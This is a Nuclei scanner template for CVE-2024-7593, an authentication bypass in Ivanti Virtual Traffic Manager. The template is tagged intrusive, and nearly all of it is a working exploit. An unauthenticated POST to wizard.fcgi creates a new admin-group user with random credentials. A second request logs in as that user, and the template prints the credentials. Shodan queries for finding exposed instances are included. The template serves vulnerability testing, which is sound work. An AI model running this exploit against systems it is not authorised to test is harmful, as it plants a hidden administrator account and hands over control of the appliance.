flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - wizardtitletext
  raw:
  - 'POST /apps/zxtm/wizard.fcgi?error=1&section=Access+Management%3ALocalUsers HTTP/1.1

    Host: {{Hostname}}


    _form_submitted=form&create_user=Create&group=admin&newusername={{username}}&password1={{password}}&password2={{password}}

    '
- extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - condition: and
    part: header
    type: word
    words:
    - 'Location: /apps/zxtm/'
    - 'Set-Cookie: ZeusTMZAUTH='
    - 'Set-Cookie: ZeusTMZAUTHTIME='
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - '@timeout: 15s

    POST /apps/zxtm/login.cgi HTTP/1.1

    Host: {{Hostname}}

    Origin: {[RootURL]}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycznFUOqD0Y01A9B5

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

    Referer: {{RootURL}}/apps/zxtm/login.cgi


    ------WebKitFormBoundarycznFUOqD0Y01A9B5

    Content-Disposition: form-data; name="_form_submitted"


    form

    ------WebKitFormBoundarycznFUOqD0Y01A9B5

    Content-Disposition: form-data; name="form_username"


    {{username}}

    ------WebKitFormBoundarycznFUOqD0Y01A9B5

    Content-Disposition: form-data; name="form_password"


    {{password}}

    ------WebKitFormBoundarycznFUOqD0Y01A9B5

    Content-Disposition: form-data; name="form_submit"


    Login

    ------WebKitFormBoundarycznFUOqD0Y01A9B5--

    '
id: CVE-2024-7593
info:
  author: gy741
  classification:
    cve-id: CVE-2024-7593
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.09526
    epss-score: 0.00043
  description: 'Incorrect implementation of an authentication algorithm in Ivanti
    vTM other than versions 22.2R1 or 22.7R2 allows a remote unauthenticated attacker
    to bypass authentication of the admin panel.

    '
  metadata:
    max-request: 2
    product: virtual traffic manager
    shodan-query:
    - http.favicon.hash:1862800928
    - html:"apps/zxtm/login.cgi"
    vendor: ivanti
    verified: true
  name: Ivanti vTM - Authentication Bypass
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-7593
  - https://packetstormsecurity.com/files/download/179906/ivantiadc99-bypass.txt
  - https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Virtual-Traffic-Manager-vTM-CVE-2024-7593
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: critical
  tags: packetstorm,cve2024,cve,auth-bypass,ivanti,intrusive
variables:
  password: '{{rand_base(8)}}'
  username: '{{rand_base(6)}}'
